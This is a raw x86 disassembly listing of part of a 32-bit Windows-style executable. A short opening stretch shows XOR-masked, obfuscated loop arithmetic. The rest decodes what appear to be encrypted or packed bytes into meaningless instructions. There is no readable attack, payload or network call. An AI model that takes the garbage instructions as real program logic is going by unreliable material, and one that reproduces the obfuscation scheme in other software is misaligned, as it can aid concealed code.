  406025:	add    ecx,esi
  406027:	lea    ecx,[ebp+ecx*4-0x64]
  40602b:	mov    edi,DWORD PTR [ecx]
  40602d:	add    edx,edi
  40602f:	mov    DWORD PTR [ecx],edx
  406031:	mov    ecx,DWORD PTR [ebp+0x8]
  406034:	xor    ecx,eax
  406036:	add    ecx,esi
  406038:	jne    0x406004
  40603e:	jmp    0x406089
  406043:	mov    ecx,DWORD PTR [ebp+0x8]
  406046:	mov    edx,DWORD PTR [ebp-0x8]
  406049:	xor    ecx,eax
  40604b:	xor    edx,eax
  40604d:	sub    ecx,edx
  40604f:	sub    ecx,esi
  406051:	xor    ecx,eax
  406053:	mov    DWORD PTR [ebp+0x8],ecx
  406056:	mov    ecx,DWORD PTR [ebp+0x8]
  406059:	mov    edx,DWORD PTR [ebp+0x8]
  40605c:	xor    ecx,eax
  40605e:	imul   edx,edx,0x5708f5
  406064:	add    ecx,esi
  406066:	lea    ecx,[ebp+ecx*4-0x64]
  40606a:	mov    edi,DWORD PTR [ecx]
  40606c:	add    edx,edi
  40606e:	mov    DWORD PTR [ecx],edx
  406070:	mov    ecx,DWORD PTR [ebp+0x8]
  406073:	xor    ecx,eax
  406075:	add    ecx,esi
  406077:	jne    0x406043
  40607d:	mov    ecx,DWORD PTR [ebp-0x8]
  406080:	xor    ecx,eax
  406082:	mov    eax,DWORD PTR [ebp+0x10]
  406085:	add    ecx,esi
  406087:	mov    DWORD PTR [eax],ecx
  406089:	pop    edi
  40608a:	jmp    0x40840d
  40608f:	inc    edx
  406090:	push   0x14
  406092:	add    DWORD PTR [ebx+ebp*2+0x53],esp
  406096:	imul   eax,esi,0x9ca0f463
  40609c:	mov    ebx,0x3cb6648f
  4060a1:	bound  esp,QWORD PTR [edx+0x1c]
  4060a4:	pop    edi
  4060a5:	bound  esp,QWORD PTR [edx+0x76]
  4060a8:	enter  0x53b1,0xdc
  4060ac:	sbb    ecx,0xffffffd5
  4060af:	ins    DWORD PTR es:[edi],dx
  4060b0:	lods   eax,DWORD PTR ds:[esi]
  4060b1:	ficom  DWORD PTR [esi]
  4060b3:	push   eax
  4060b4:	cvtps2pd xmm1,xmm1
  4060b7:	mov    ebx,DWORD PTR [ecx-0x21]
  4060ba:	push   ebx
  4060bb:	shl    ecx,1
  4060bd:	aaa    
  4060be:	cdq    
  4060bf:	add    DWORD PTR [eax+0x7f],esp
  4060c2:	mov    eax,ds:0xc9622079
  4060c7:	push   edi
  4060c8:	mov    cl,0x1c
  4060ca:	or     BYTE PTR [edx],ah
  4060cc:	sbb    ch,dl
  4060ce:	fisttp WORD PTR [ebp-0x415a8f29]
  4060d4:	sahf   
  4060d5:	xchg   ecx,eax
  4060d6:	mov    ah,0xbf
  4060d8:	enter  0x932a,0xca
  4060dc:	out    dx,al
  4060dd:	add    al,0x97
  4060df:	sub    eax,0x14d47dc3
  4060e4:	jbe    0x4060f4
  4060e6:	inc    edx
  4060e7:	enter  0x377b,0x57
  4060eb:	loope  0x406127
  4060ed:	lock cmp ch,BYTE PTR [edi]
  4060f0:	data16 in al,dx
  4060f2:	push   ss
  4060f3:	sbb    ebp,eax
  4060f5:	pop    edi
  4060f6:	adc    al,0x75
  4060f8:	mov    edx,0xb3653747
  4060fd:	test   DWORD PTR fs:[edi-0x5b],ebx
  406101:	pop    esp
  406102:	adc    al,0x4
  406104:	xchg   BYTE PTR [edx],cl
  406106:	mov    ds:0xa71edf94,al
  40610b:	scas   al,BYTE PTR es:[edi]
  40610c:	pop    ebp
  40610d:	mov    ebx,0x32c10b84
  406112:	jo     0x4060a9
  406114:	pushf  
  406115:	repz (bad) 
  406117:	and    eax,DWORD PTR [ecx+0x57]
  40611a:	push   esp
  40611b:	push   ebx
  40611c:	(bad)  
  40611e:	push   eax
  40611f:	ficom  WORD PTR [edx+ebp*2]
  406122:	xchg   edi,eax
  406123:	mov    bl,0xbd
  406125:	push   edi
  406126:	xor    al,0x1d
  406128:	(bad)  
  406129:	mov    al,0xb8
  40612b:	inc    ebx
  40612c:	jmp    0x15f2:0xa7b88330
  406133:	mov    bl,0xaf
  406135:	or     eax,0x68c08e55
  40613a:	enter  0x1785,0xf0
  40613e:	(bad)  
  40613f:	pop    ss
  406140:	jmp    0xb47b:0xfd41615f
  406147:	imul   BYTE PTR [esi]
  406149:	or     al,0xda
  40614b:	push   es
  40614c:	mov    esp,0xf0fccb3
  406151:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  406153:	mov    WORD PTR [edi],es
  406155:	or     eax,DWORD PTR [ecx+0x5d]
  406158:	fchs   
  40615a:	cmp    eax,0x71412aa5
  40615f:	and    bh,dh
  406161:	mov    dl,0x1f
  406163:	test   al,0xc7
  406165:	jne    0x406135
  406167:	xchg   DWORD PTR [ecx+0x40],ebp
  40616a:	ret    
  40616b:	inc    edx
  40616c:	and    eax,0x844223c4
  406171:	and    ecx,DWORD PTR [edi]
  406173:	mov    ch,0x4a
  406175:	aad    0x93
  406177:	cld    
  406178:	test   eax,0x8667b478
  40617d:	ret    0xaf91
  406180:	dec    ebx
  406181:	out    dx,eax
  406182:	jmp    0xec39f25c
  406187:	xchg   edx,eax
  406188:	adc    BYTE PTR [esi],0xf9
  40618b:	jp     0x4061c5
  40618d:	mov    esi,0x4cfb8a5d
  406192:	test   DWORD PTR [edx],eax
  406194:	shl    BYTE PTR [esi-0x3b],0xb9
  406198:	lahf   
  406199:	sub    BYTE PTR [edx+0x1b],ch
  40619c:	xchg   ebx,eax
  40619d:	out    dx,al
  40619e:	push   edi
  40619f:	sbb    esi,0x36c82e83
  4061a5:	(bad)  
  4061a6:	jge    0x406130
  4061a8:	mov    eax,ds:0x968badd1
  4061ad:	push   ebx
  4061ae:	scas   eax,DWORD PTR es:[edi]
  4061af:	inc    eax
  4061b0:	push   0xffffffff
  4061b2:	call   0xb9b3ddd1
  4061b7:	jmp    0x58de:0xac4a221b
  4061be:	sub    eax,0xfafc8867
  4061c3:	call   0x8bd5f150
  4061c8:	hlt    
  4061c9:	adc    ebp,DWORD PTR [ecx+0x58]
  4061cc:	js     0x4061e0
  4061ce:	(bad)  
  4061cf:	push   edx
  4061d0:	mov    ds:0x5a93666b,al
  4061d5:	setns  BYTE PTR [ecx]
  4061d8:	adc    edx,DWORD PTR [edi]
  4061da:	les    esi,FWORD PTR [edi]
  4061dc:	daa    
  4061dd:	(bad)  
  4061de:	cmp    al,0xb8
  4061e0:	sub    dh,bh
  4061e2:	hlt    
  4061e3:	sub    dl,BYTE PTR [ecx]
  4061e5:	popa   
  4061e6:	into   
  4061e7:	enter  0x862e,0xb3
  4061eb:	mov    ecx,0x9fbedd73
  4061f0:	push   esp
  4061f1:	mov    eax,ds:0xce112701
  4061f6:	loopne 0x406214
  4061f8:	jl     0x40620f
  4061fa:	scas   eax,DWORD PTR es:[edi]
  4061fb:	cli    
  4061fc:	jne    0x4061e9
  4061fe:	and    dl,ch
  406200:	es jnp 0x4061e4
  406203:	cmp    ecx,DWORD PTR [ebx-0x7e]
  406206:	mov    bl,0x1e
  406208:	inc    esi
  406209:	cmp    al,al
  40620b:	pop    es
  40620c:	sbb    edi,ecx
  40620e:	pop    ebx
  40620f:	nop
  406210:	andps  xmm3,XMMWORD PTR [eax+0x15]
  406214:	loopne 0x40623d
  406216:	mov    bh,0x15
  406218:	and    BYTE PTR [edi],ch
  40621a:	mov    eax,ds
  40621c:	mov    eax,ds:0xb05e2705
  406221:	sbb    edx,DWORD PTR [ebx-0x13bdfe45]
  406227:	loop   0x4061db
  406229:	sub    al,0x2f
  40622b:	mul    ecx
  40622d:	mov    ah,al
  40622f:	mov    ebp,0x68b9bdbb
  406234:	(bad)  
  406235:	arpl   WORD PTR [ecx],ax
  406237:	loop   0x406253
  406239:	test   al,0xac
  40623b:	mov    WORD PTR [ecx-0x13],gs
  40623e:	mov    ecx,0xc916301f
  406243:	xor    DWORD PTR [esi+0x63],ecx
  406246:	xor    al,0xea
  406248:	bound  eax,QWORD PTR [esp+eiz*2-0x3ff036ed]
  40624f:	jg     0x4062bd
  406251:	xchg   esp,eax
  406252:	sti    
  406253:	aam    0xb7
  406255:	dec    BYTE PTR [ebp+0x72]
  406258:	push   eax
  406259:	scas   al,BYTE PTR es:[edi]
  40625a:	or     eax,0x3a7a2c2b
  40625f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406260:	pushf  
  406261:	in     al,dx
  406262:	sbb    DWORD PTR [ebx],esp
  406264:	pop    ds
  406265:	ss mov ebp,0xaa84f18
  40626b:	pop    eax
  40626c:	mov    bl,0x98
  40626e:	mov    BYTE PTR [ecx],bl
  406270:	jnp    0x4062eb
  406272:	add    DWORD PTR [edx+edx*1],0xffffffe6
  406276:	in     eax,0x2b
  406278:	out    dx,eax
  406279:	inc    esi
  40627a:	adc    eax,0x6d95014f
  40627f:	call   DWORD PTR [edi-0x1276c3f1]
  406285:	(bad)  
  406286:	adc    esi,DWORD PTR [edi-0x2bca2568]
  40628c:	out    0xeb,eax
  40628e:	in     eax,0x5f
  406290:	jo     0x406307
  406292:	shr    ch,0x76
  406295:	mov    ds:0xe6df63b,al
  40629a:	or     DWORD PTR ds:0x3fc70f73,ecx
  4062a0:	adc    al,0x78
  4062a2:	ret    0x28df
  4062a5:	daa    
  4062a6:	call   0xa76be482
  4062ab:	bound  esi,QWORD PTR [eax+0x34]
  4062ae:	ret    
  4062af:	lods   eax,DWORD PTR ds:[esi]
  4062b0:	mov    ds:0x65e17058,eax
  4062b5:	fcomp  QWORD PTR [ebx+0x19]
  4062b8:	scas   al,BYTE PTR es:[edi]
  4062b9:	inc    esi
  4062ba:	(bad)  
  4062bb:	dec    ebp
  4062bc:	int    0x9f
  4062be:	test   BYTE PTR [ebx],ch
  4062c0:	cmp    BYTE PTR [ebx+0x58],bh
  4062c3:	call   FWORD PTR [esi-0x61]
  4062c6:	mov    ecx,0x29434faa
  4062cb:	inc    BYTE PTR [edi+0x2b2804c1]
  4062d1:	(bad)  
  4062d2:	out    0xf6,al
  4062d4:	push   edi
  4062d5:	or     eax,ecx
  4062d7:	pop    esp
  4062d8:	rcr    BYTE PTR [edi+0x66],cl
  4062db:	dec    ebp
  4062dc:	push   edi
  4062dd:	pop    ebp
  4062de:	dec    ebx
  4062df:	add    al,0x7a
  4062e1:	dec    edx
  4062e2:	push   ecx
  4062e3:	daa    
  4062e4:	add    BYTE PTR [ecx+0x7a36ebc],al
  4062ea:	xor    DWORD PTR [esi+esi*8-0x29],esp
  4062ee:	mov    bh,0x57
  4062f0:	in     al,0xad
  4062f2:	adc    cl,BYTE PTR [esi]
  4062f4:	xchg   edx,eax
  4062f5:	cwde   
  4062f6:	and    DWORD PTR [esi+0x1a],0xffffffd7
  4062fa:	in     al,dx
  4062fb:	in     al,0x6a
  4062fd:	or     dh,BYTE PTR [ebx-0x78a847bc]
  406303:	push   cs
  406304:	lea    eax,[ecx]
  406306:	push   es
  406307:	lods   eax,DWORD PTR ds:[esi]
  406308:	xchg   bl,bl
  40630a:	jmp    0x4062a9
  40630c:	pop    ebx
  40630d:	mov    ebp,0xc9ff8bbb
  406312:	mov    ds:0xa6d6b1dc,eax
  406317:	lods   al,BYTE PTR ds:[esi]
  406318:	je     0x40629f
  40631a:	jnp    0x406329
  40631c:	jg     0x406375
  40631e:	sti    
  40631f:	sub    dl,BYTE PTR [ebp-0x317712ec]
  406325:	mov    edx,0xf6af151d
  40632a:	xlat   BYTE PTR ds:[ebx]
  40632b:	cmp    DWORD PTR [eax],esi
  40632d:	sbb    dh,BYTE PTR [eax+0x1d1bd1f]
  406333:	pop    esi
  406334:	out    dx,eax
  406335:	dec    edx
  406336:	cmp    ecx,ecx
  406338:	jmp    0xd6d1:0xe866dc5e
  40633f:	sbb    esp,DWORD PTR [edi]
  406341:	adc    dh,dl
  406343:	dec    eax
  406344:	out    dx,eax
  406345:	jmp    0xa719ce97
  40634a:	pop    ebp
  40634b:	ss aad 0x25
  40634e:	das    
  40634f:	out    dx,al
  406350:	pop    edx
  406351:	add    al,0xde
  406353:	push   0x20
  406355:	in     eax,0x8f
  406357:	xor    ch,dh
  406359:	or     al,dl
  40635b:	or     DWORD PTR [esp+edx*1],0xffffffba
  40635f:	sbb    eax,0x79c1b5fa
  406364:	cmc    
  406365:	mov    eax,0x6e0c1ec8
  40636a:	add    BYTE PTR [edi],ch
  40636c:	icebp  
  40636d:	inc    eax
  40636e:	sub    eax,0xcd30e7f4
  406373:	pop    ecx
  406374:	dec    esi
  406375:	xchg   BYTE PTR gs:[edx],cl
  406378:	add    eax,0x578de893
  40637d:	retf   
  40637e:	bound  edx,QWORD PTR [edi-0x5db4156a]
  406384:	sbb    BYTE PTR [ecx],cl
  406386:	int3   
  406387:	xchg   ecx,eax
  406388:	jno    0x4063bd
  40638a:	mov    esp,0xab4c6244
  40638f:	ret    
  406390:	mov    ch,0xf4
  406392:	dec    ebp
  406393:	cmp    eax,0x301ac034
  406398:	lea    esi,[ecx+0x65]
  40639b:	mov    eax,ds:0x6888f66c
  4063a0:	test   DWORD PTR [eax+0x52018d47],ebp
  4063a6:	inc    ecx
  4063a7:	sbb    al,0x7b
  4063a9:	not    DWORD PTR [edx+0x379d0c7f]
  4063af:	xor    eax,0x563e3f
  4063b4:	iret   
  4063b5:	je     0x40638d
  4063b7:	or     bh,BYTE PTR [ebp+0x3cce4fd4]
  4063bd:	pushf  
  4063be:	cmp    ecx,DWORD PTR [esi-0x2e]
  4063c1:	xchg   edi,eax
  4063c2:	adc    BYTE PTR [esi],bl
  4063c4:	mov    esi,0xafb6735b
  4063c9:	jle    0x40643d
  4063cb:	ret    0x861e
  4063ce:	jno    0x4063b7
  4063d0:	mov    bl,0x7e
  4063d2:	stos   DWORD PTR es:[edi],eax
  4063d3:	jno    0x406390
  4063d5:	fbstp  TBYTE PTR [eax+0x0]
  4063d8:	push   0x4e355913
  4063dd:	push   edx
  4063de:	sbb    al,0x38
  4063e0:	xor    DWORD PTR [eax+0x20],esi
  4063e3:	mul    BYTE PTR [ebx]
  4063e5:	out    0x5f,eax
  4063e7:	jnp    0x406398
  4063e9:	outs   dx,BYTE PTR ds:[esi]
  4063ea:	pop    ebx
  4063eb:	and    BYTE PTR [ebx+0x1987a786],0x89
  4063f2:	test   DWORD PTR [ebx-0x57d74946],esp
  4063f8:	ficom  DWORD PTR [edx]
  4063fa:	or     eax,0x45463dca
  4063ff:	sahf   
  406400:	mov    ecx,0xe7a38c1a
  406405:	sub    ah,dl
  406407:	jae    0x40640e
  406409:	ud2    
  40640b:	add    esi,edx
  40640d:	(bad)  
  40640e:	xor    al,0x1a
  406410:	jns    0x40644a
  406412:	xor    eax,0x2d3ae781
  406417:	push   es
  406418:	lock inc edi
  40641a:	adc    ch,ah
  40641c:	xchg   esi,eax
  40641d:	aad    0xb5
  40641f:	or     esp,DWORD PTR [edx]
  406421:	mov    bl,0xad
  406423:	ss mov ch,0x71
  406426:	jae    0x4063d0
  406428:	ret    0x56e
  40642b:	ja     0x4064aa
  40642d:	(bad)  
  40642f:	xor    al,0x92
  406431:	push   esp
  406432:	test   bh,0x52
  406435:	mov    ch,0x13
  406437:	iret   
  406438:	mov    al,0xf4
  40643a:	push   ecx
  40643b:	popf   
  40643c:	pop    esp
  40643d:	shl    al,cl
  40643f:	inc    esi
  406440:	inc    esi
  406441:	imul   esp,DWORD PTR [edi+0x59df83d7],0xbc9e0339
  40644b:	push   ebx
  40644c:	cmp    edi,DWORD PTR [eax+0x59183e49]
  406452:	adc    DWORD PTR [edx+0x505643bf],ebp
  406458:	repnz test DWORD PTR [edi-0x36],ebp
  40645c:	and    al,0xf5
  40645e:	cld    
  40645f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406460:	and    bl,BYTE PTR [ebx]
  406462:	retf   
  406463:	(bad)  
  406464:	fdiv   DWORD PTR [eax-0x59ab091]
  40646a:	adc    al,0x0
  40646c:	les    esi,FWORD PTR [eax-0x1b]
  40646f:	inc    esp
  406470:	loope  0x406451
  406472:	mov    ch,0x49
  406474:	ja     0x4064ef
  406476:	imul   esi,DWORD PTR [ebx-0x36],0x7595751e
  40647d:	pop    ds
  40647e:	icebp  
  40647f:	and    DWORD PTR [eax],0xffffffd7
  406482:	nop
  406483:	icebp  
  406484:	xchg   edi,eax
  406485:	sbb    eax,0x8c24638d
  40648a:	push   edx
  40648b:	data16 cld 
  40648d:	scas   eax,DWORD PTR es:[edi]
  40648e:	pop    eax
  40648f:	inc    eax
  406490:	(bad)  ds:0x7465a157
  406496:	mov    dh,0x17
  406498:	bound  edx,QWORD PTR [bx]
  40649b:	in     eax,0x64
  40649d:	xor    DWORD PTR [edx+0x3d4dd918],eax
  4064a3:	push   cs
  4064a4:	pushf  
  4064a5:	out    dx,eax
  4064a6:	iret   
  4064a7:	(bad)  
  4064a8:	cli    
  4064a9:	aaa    
  4064aa:	xchg   ebp,eax
  4064ab:	in     al,dx
  4064ac:	out    dx,al
  4064ad:	popa   
  4064ae:	les    ecx,FWORD PTR [ebx+0x11]
  4064b1:	push   esi
  4064b2:	xchg   edx,eax
  4064b3:	inc    eax
  4064b4:	jns    0x406528
  4064b6:	loopne 0x4064bf
  4064b8:	sahf   
  4064b9:	add    DWORD PTR [ebp+0x55],ebx
  4064bc:	das    
  4064bd:	lds    esp,FWORD PTR [ebx+0x42]
  4064c0:	dec    ecx
  4064c1:	mov    bh,0x57
  4064c3:	loop   0x4064b5
  4064c5:	call   0x8c3aaf69
  4064ca:	fild   DWORD PTR [edx]
  4064cc:	jae    0x4064fe
  4064ce:	fisubr DWORD PTR [edi]
  4064d0:	pop    esp
  4064d1:	(bad)  
  4064d2:	mov    esi,0x74faf8b0
  4064d7:	std    
  4064d8:	push   eax
  4064d9:	mov    esi,0xaf58b2b8
  4064de:	(bad)  
  4064df:	jg     0x40651d
  4064e1:	daa    
  4064e2:	call   0x82ed2988
  4064e7:	dec    ebp
  4064e8:	mov    ebp,?
  4064ea:	jle    0x40649a
  4064ec:	ja     0x4064cf
  4064ee:	mov    cl,0xfc
  4064f0:	adc    eax,0xc2b7b824
  4064f5:	sub    esp,DWORD PTR [eax+0x4872bbfb]
  4064fb:	push   esp
  4064fc:	jmp    0x2dc6903b
  406501:	stos   DWORD PTR es:[edi],eax
  406502:	div    DWORD PTR [ecx+0x3d984e2f]
  406508:	adc    BYTE PTR [ecx-0xb],dh
  40650b:	jae    0x406518
  40650d:	cmp    al,BYTE PTR [edx+0x4d2d31bd]
  406513:	push   ss
  406514:	ret    0xbc5a
  406517:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406518:	imul   edi,DWORD PTR [ebx+eax*1],0x6f1550dd
  40651f:	sbb    eax,0x94b81752
  406524:	xchg   edx,eax
  406525:	ret    0x183e
  406528:	nop
  406529:	or     BYTE PTR [esi-0x4b3a8b4],dh
  40652f:	stos   BYTE PTR es:[edi],al
  406530:	sub    eax,0x213e6ef9
  406535:	jle    0x40655f
  406537:	fild   DWORD PTR [edi]
  406539:	inc    ebp
  40653a:	fsubr  QWORD PTR [ecx-0x2d]
  40653d:	and    DWORD PTR [edi],0xe285cc48
  406543:	test   BYTE PTR [edx-0x2b],bh
  406546:	mov    ebp,0xeed20290
  40654b:	lahf   
  40654c:	pop    edx
  40654d:	adc    al,0xbc
  40654f:	fisubr DWORD PTR [eax-0x3c]
  406552:	xchg   edx,eax
  406553:	pop    edi
  406554:	sbb    cl,ah
  406556:	fs (bad) 
  406558:	jbe    0x406568
  40655a:	icebp  
  40655b:	lods   eax,DWORD PTR ds:[esi]
  40655c:	xchg   edi,eax
  40655d:	retw   
  40655f:	imul   esi,ebp,0xffffffa2
  406562:	or     DWORD PTR [edx+eax*2+0x3],edx
  406566:	push   cs
  406567:	push   cs
  406568:	jbe    0x4065b9
  40656a:	imul   esi,ebx,0x65
  40656d:	enter  0x7378,0xe1
  406571:	(bad)  
  406573:	ds ret 
  406575:	jne    0x4065b4
  406577:	dec    ebx
  406578:	sub    DWORD PTR [esi-0x43],ebx
  40657b:	and    ebx,DWORD PTR [ebp+eax*4-0x4a]
  40657f:	xchg   esp,ecx
  406581:	push   cs
  406582:	jnp    0x4065b8
  406584:	(bad)  
  406585:	cmp    al,0xf7
  406587:	push   ss
  406588:	(bad)  
  40658a:	push   0xb412d75
  40658f:	sub    BYTE PTR fs:[edi+edx*1+0x29],0x8c
  406595:	pop    ebx
  406596:	and    eax,0xd5a26a03
  40659b:	(bad)  
  40659c:	cmc    
  40659d:	daa    
  40659e:	xchg   ebx,eax
  40659f:	fsubr  st(6),st
  4065a1:	in     al,0xf6
  4065a3:	cli    
  4065a4:	aam    0x7b
  4065a6:	enter  0x526f,0x56
  4065aa:	add    al,0xb8
  4065ac:	outs   dx,BYTE PTR ds:[esi]
  4065ad:	mov    ch,0x35
  4065af:	adc    cl,dl
  4065b1:	cs jecxz 0x4065d7
  4065b4:	lahf   
  4065b5:	mov    edx,0x755200c5
  4065ba:	imul   edx,DWORD PTR [edi-0x5c],0xffffffaf
  4065be:	inc    eax
  4065bf:	pop    es
  4065c0:	or     BYTE PTR [edi+ebx*8-0x51],al
  4065c4:	xor    ah,BYTE PTR ds:[edi+0x5]
  4065c8:	xor    eax,0x63ed0047
  4065cd:	dec    edi
  4065ce:	test   al,0x63
  4065d0:	icebp  
  4065d1:	mov    ds:0x35cab492,al
  4065d6:	xor    al,0xa7
  4065d8:	cwde   
  4065d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065da:	ret    0x881e
  4065dd:	stos   BYTE PTR es:[edi],al
  4065de:	outs   dx,BYTE PTR ds:[esi]
  4065df:	sub    BYTE PTR [ecx+esi*4+0x21],0xb2
  4065e4:	or     cl,bl
  4065e6:	push   0xffffffc4
  4065e8:	inc    esp
  4065e9:	leave  
  4065ea:	(bad)  
  4065eb:	mov    ah,BYTE PTR [ebp+ebp*8-0x6ae15405]
  4065f2:	sbb    edx,DWORD PTR [ecx+0x6a5725f]
  4065f8:	jno    0x4065f0
  4065fa:	ficom  DWORD PTR [ebx+eiz*4-0xdae86b6]
  406601:	loop   0x4065a3
  406603:	jo     0x406592
  406605:	jg     0x406667
  406607:	inc    edx
  406608:	pop    es
  406609:	in     al,dx
  40660a:	loope  0x40658f
  40660c:	popf   
  40660d:	mov    es,WORD PTR [edi+0x3e]
  406610:	imul   ebx,DWORD PTR [edx+eiz*8+0x4e],0x6f
  406615:	sbb    esp,DWORD PTR [edx]
  406617:	mov    ebx,0xc709b539
  40661c:	or     eax,0xd392961f
  406621:	inc    ecx
  406622:	popf   
  406623:	push   ds
  406624:	push   ebx
  406625:	ret    0xd19
  406628:	dec    edx
  406629:	mov    BYTE PTR [edx+ecx*4+0x2ce6363f],0x3f
  406631:	addr16 cmp al,0xda
  406634:	mov    edi,0x50f17da2
  406639:	sub    edx,DWORD PTR [ecx-0x2a7be8b0]
  40663f:	pop    ebp
  406640:	mov    DWORD PTR [eax+0x33a34324],0xa0505289
  40664a:	or     edx,eax
  40664c:	push   ss
  40664d:	call   0x7ae:0xb442990e
  406654:	inc    edx
  406655:	outs   dx,BYTE PTR ds:[esi]
  406656:	daa    
  406657:	sbb    ah,al
  406659:	ficomp WORD PTR [edi]
  40665b:	les    ecx,FWORD PTR [ebp+0x2]
  40665e:	xchg   ecx,eax
  40665f:	jmp    0xaadf:0x1d9aa9c8
  406666:	hlt    
  406667:	fcomp  QWORD PTR [edx-0x3fbaf17e]
  40666d:	and    bh,BYTE PTR [esi]
  40666f:	inc    eax
  406670:	jbe    0x40665c
  406672:	xor    al,0x44
  406674:	test   eax,0x532743ba
  406679:	enter  0x92c9,0xca
  40667d:	xadd   DWORD PTR [edi-0x4cb9cf00],esi
  406684:	clc    
  406685:	inc    esp
  406686:	inc    ebp
  406687:	fcomp  QWORD PTR [esi]
  406689:	jp     0x4066c2
  40668b:	xchg   edi,eax
  40668c:	pop    edi
  40668d:	push   ss
  40668e:	jmp    0x13f7:0x9230254a
  406695:	jo     0x406667
  406697:	neg    DWORD PTR [esi+0x72]
  40669a:	rcr    DWORD PTR [eax+0x4d],cl
  40669d:	sti    
  40669e:	cli    
  40669f:	jp     0x40663e
  4066a1:	ss mov esp,0xeb1d613a
  4066a7:	mov    ecx,0xafb30fb1
  4066ac:	popa   
  4066ad:	mov    ebx,0xfa83658a
  4066b2:	sub    edx,DWORD PTR [ecx]
  4066b4:	enter  0xb55d,0x34
  4066b8:	pop    edx
  4066b9:	enter  0x5124,0x56
  4066bd:	mov    dh,0xbd
  4066bf:	retf   0x28fc
  4066c2:	push   0xffffffbe
  4066c4:	push   ecx
  4066c5:	(bad)  
  4066c6:	into   
  4066c7:	popf   
  4066c8:	dec    edi
  4066c9:	mov    edx,0x137e0231
  4066ce:	mov    ch,0x2
  4066d0:	loopne 0x4066cd
  4066d2:	xchg   ebx,eax
  4066d3:	push   es
  4066d4:	iret   
  4066d5:	add    BYTE PTR [ebx],0x8d
  4066d8:	mov    ds:0xde71081e,al
  4066dd:	sbb    ah,BYTE PTR [ebp+0x2d]
  4066e0:	and    ah,BYTE PTR [esi+0x1a]
  4066e3:	dec    eax
  4066e4:	xchg   edx,eax
  4066e5:	xchg   esp,eax
  4066e6:	out    dx,al
  4066e7:	sbb    al,0xb7
  4066e9:	pop    ebx
  4066ea:	popf   
  4066eb:	dec    ecx
  4066ec:	popf   
  4066ed:	push   eax
  4066ee:	jb     0x4066b3
  4066f0:	adc    DWORD PTR [esi+0x6f4cfab5],edx
  4066f6:	inc    edx
  4066f7:	pop    ds
  4066f8:	mov    edx,0xdc6fd253
  4066fd:	aaa    
  4066fe:	cmp    al,0xed
  406700:	xor    BYTE PTR [ecx-0x1],ch
  406703:	sti    
  406704:	rcl    esi,0x5e
  406707:	or     al,BYTE PTR [ebx]
  406709:	ret    
  40670a:	mov    bl,0x82
  40670c:	iret   
  40670d:	inc    ebp
  40670e:	add    DWORD PTR [esi+edi*2-0x6b987945],esi
  406715:	aas    
  406716:	push   ebx
  406717:	aad    0x6e
  406719:	sti    
  40671a:	and    edi,DWORD PTR [ebx+0x366d344b]
  406720:	pop    edi
  406721:	stc    
  406722:	and    BYTE PTR [esi],bh
  406724:	mov    edx,0x51cf80b1
  406729:	mov    DWORD PTR [ebp+0x23],esi
  40672c:	scas   eax,DWORD PTR es:[edi]
  40672d:	enter  0x49af,0xa6
  406731:	mov    ch,0x34
  406733:	inc    edx
  406734:	ja     0x406775
  406736:	fwait
  406737:	pop    ebp
  406738:	mov    edx,0x6ad5cc2d
  40673d:	in     eax,0x7a
  40673f:	ja     0x406748
  406741:	icebp  
  406742:	retf   0x55e5
  406745:	jecxz  0x4067b7
  406747:	out    dx,al
  406748:	std    
  406749:	ins    BYTE PTR es:[edi],dx
  40674a:	js     0x40670f
  40674c:	cmc    
  40674d:	mov    ebx,0xfef526fb
  406752:	(bad)  
  406754:	sub    eax,0xa694fcb3
  406759:	push   0x4d
  40675b:	das    
  40675c:	or     esp,eax
  40675e:	sbb    al,0x0
  406760:	(bad)  
  406761:	fstp   DWORD PTR ss:[esi+eiz*1-0x68]
  406766:	sbb    bl,ah
  406768:	or     al,0xd0
  40676a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40676b:	in     al,dx
  40676c:	jbe    0x406751
  40676e:	xchg   ebx,eax
  40676f:	fs gs pop edx
  406772:	daa    
  406773:	sub    eax,0xb8c52b2a
  406778:	adc    al,0x35
  40677a:	jge    0x4067b8
  40677c:	call   0x2ef9:0x99abb1fe
  406783:	aad    0x42
  406785:	out    dx,eax
  406786:	loopne 0x40671a
  406788:	mov    esp,0xcab99c19
  40678d:	fstp   DWORD PTR [esi]
  40678f:	dec    ecx
  406790:	fst    QWORD PTR [ebx-0x20]
  406793:	sbb    DWORD PTR [ecx+0x66],ecx
  406796:	cmc    
  406797:	mov    al,0xfa
  406799:	cld    
  40679a:	xchg   ecx,eax
  40679b:	enter  0x6749,0x4
  40679f:	jb     0x4067bd
  4067a1:	int    0xb3
  4067a3:	fsub   st(2),st
  4067a5:	daa    
  4067a6:	dec    edi
  4067a7:	(bad)  
  4067a9:	sbb    eax,0xa8018ac3
  4067ae:	mov    ds:0xed1e3cce,eax
  4067b3:	outs   dx,DWORD PTR ds:[esi]
  4067b4:	addr16 and al,0x66
  4067b7:	xor    al,0xda
  4067b9:	fsub   QWORD PTR [esp+esi*8-0x6132c63d]
  4067c0:	dec    ecx
  4067c1:	fstp   TBYTE PTR [ebp+edi*2+0x4b]
  4067c5:	mov    bl,0x20
  4067c7:	aam    0xb9
  4067c9:	lods   al,BYTE PTR ds:[esi]
  4067ca:	ret    0xaf2b
  4067cd:	xchg   BYTE PTR [ecx],dl
  4067cf:	mov    ah,0x2c
  4067d1:	scas   al,BYTE PTR es:[edi]
  4067d2:	xchg   edi,eax
  4067d3:	into   
  4067d4:	push   esi
  4067d5:	jecxz  0x40679e
  4067d7:	pop    esi
  4067d8:	jae    0x406844
  4067da:	retf   
  4067db:	pop    ebx
  4067dc:	cmp    ch,BYTE PTR [ebp-0x2c]
  4067df:	xchg   ebx,eax
  4067e0:	xor    al,0x6e
  4067e2:	outs   dx,DWORD PTR ds:[esi]
  4067e3:	xchg   edi,eax
  4067e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067e5:	push   esp
  4067e6:	repnz cmc 
  4067e8:	add    dl,BYTE PTR [edx-0x286e71af]
  4067ee:	sub    bh,BYTE PTR [edi]
  4067f0:	xchg   ebx,eax
  4067f1:	loope  0x406839
  4067f3:	lods   eax,DWORD PTR ds:[esi]
  4067f4:	and    al,0x3a
  4067f6:	mov    ebp,0x1b5c8768
  4067fb:	add    esi,eax
  4067fd:	mov    eax,edx
